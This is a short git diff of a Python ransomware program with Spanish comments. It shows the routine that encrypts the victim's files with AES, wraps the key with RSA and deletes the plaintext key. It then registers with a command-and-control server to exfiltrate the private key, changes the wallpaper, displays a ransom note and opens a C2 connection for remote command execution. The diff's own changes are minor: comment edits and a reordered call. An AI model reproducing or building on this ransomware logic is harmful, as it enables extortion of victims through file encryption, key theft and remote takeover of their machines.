@@ -11,10 +11,9 @@ import sys
 
 def resource_path(relative_path):
     try:
-        base_path = sys._MEIPASS  # Si está empaquetado con PyInstaller
+        base_path = sys._MEIPASS  
     except Exception:
         base_path = os.path.abspath(".")
-
     return os.path.join(base_path, relative_path)
 
 def change_background():
@@ -55,7 +54,7 @@ def encrypt_files():
     files = find_files()  # Obtener lista de archivos a cifrar
     gen_keys.generate_aes_key()  # Generar clave simétrica
     aes_key = load_aes_key()  # Cargar la clave simétrica
-    for file in files:
+    for file in files: # Cifra cada archivo con la clave AES
         encrypt_file(file, aes_key)
     print("Archivos cifrados correctamente.")
     gen_keys.generate_rsa_key() # Generar par de claves RSA
@@ -63,8 +62,8 @@ def encrypt_files():
     encrypt_aes_key(rsa_public_key, aes_key)  # Se cifra la clave AES con la clave pública RSA
     os.remove("aes_key.bin")  # Eliminar clave simétrica sin cifrar
     os.remove("rsa_public.pem")  # Eliminar clave pública RSA
-    change_background() # Cambiar fondo de pantalla
     agent.register_agent()  # Registrar agente en C2, exfiltración de clave privada RSA
+    change_background() # Cambiar fondo de pantalla
     note.show_note() # Mostrar nota de rescate personalizada en escritorio
     agent.connect_to_c2_server() # Conexión con servidor C2 para ejecución remota de comandos
 
